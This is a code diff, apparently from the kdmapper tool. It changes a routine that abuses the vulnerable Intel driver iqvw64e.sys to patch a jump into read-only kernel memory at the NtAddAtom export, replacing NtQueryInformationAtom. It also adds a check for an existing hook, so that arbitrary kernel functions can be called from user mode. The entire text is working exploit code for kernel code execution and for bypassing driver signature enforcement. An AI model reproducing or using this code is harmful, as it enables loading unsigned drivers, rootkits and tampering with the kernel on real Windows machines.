@@ -15,6 +15,7 @@ namespace intel_driver
 	extern char driver_name[100]; //"iqvw64e.sys"
 	constexpr uint32_t ioctl1 = 0x80862007;
 	constexpr DWORD iqvw64e_timestamp = 0x5284EAC3;
+	extern ULONG64 ntoskrnlAddr;
 
 	typedef struct _COPY_MEMORY_BUFFER_INFO
 	{
@@ -152,16 +153,16 @@ namespace intel_driver
 			return false;
 
 		// Setup function call
-		HMODULE ntdll = GetModuleHandle("ntdll.dll");
+		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
 		if (ntdll == 0) {
 			std::cout << "[-] Failed to load ntdll.dll" << std::endl; //never should happens
 			return false;
 		}
 
-		const auto NtQueryInformationAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtQueryInformationAtom"));
-		if (!NtQueryInformationAtom)
+		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
+		if (!NtAddAtom)
 		{
-			std::cout << "[-] Failed to get export ntdll.NtQueryInformationAtom" << std::endl;
+			std::cout << "[-] Failed to get export ntdll.NtAddAtom" << std::endl;
 			return false;
 		}
 
@@ -169,38 +170,46 @@ namespace intel_driver
 		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
 		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;
 
-		const uint64_t kernel_NtQueryInformationAtom = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "NtQueryInformationAtom");
-		if (!kernel_NtQueryInformationAtom)
+		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "NtAddAtom");
+		if (!kernel_NtAddAtom)
 		{
-			std::cout << "[-] Failed to get export ntoskrnl.NtQueryInformationAtom" << std::endl;
+			std::cout << "[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl;
 			return false;
 		}
-			
-		if (!ReadMemory(device_handle, kernel_NtQueryInformationAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
+
+		if (!ReadMemory(device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
 			return false;
 
+		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
+			original_kernel_function[1] == kernel_injected_jmp[1] &&
+			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
+			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
+			std::cout << "[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl;
+			return false;
+		}
+
 		// Overwrite the pointer with kernel_function_address
-		if (!WriteToReadOnlyMemory(device_handle, kernel_NtQueryInformationAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
+		if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
 			return false;
 
 		// Call function
 		if constexpr (!call_void)
 		{
 			using FunctionFn = T(__stdcall*)(A...);
-			const auto Function = reinterpret_cast<FunctionFn>(NtQueryInformationAtom);
+			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);
 
 			*out_result = Function(arguments...);
 		}
 		else
 		{
 			using FunctionFn = void(__stdcall*)(A...);
-			const auto Function = reinterpret_cast<FunctionFn>(NtQueryInformationAtom);
+			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);
 
 			Function(arguments...);
 		}
 
 		// Restore the pointer/jmp
-		WriteToReadOnlyMemory(device_handle, kernel_NtQueryInformationAtom, original_kernel_function, sizeof(kernel_injected_jmp));
+		WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
 		return true;
 	}
 }
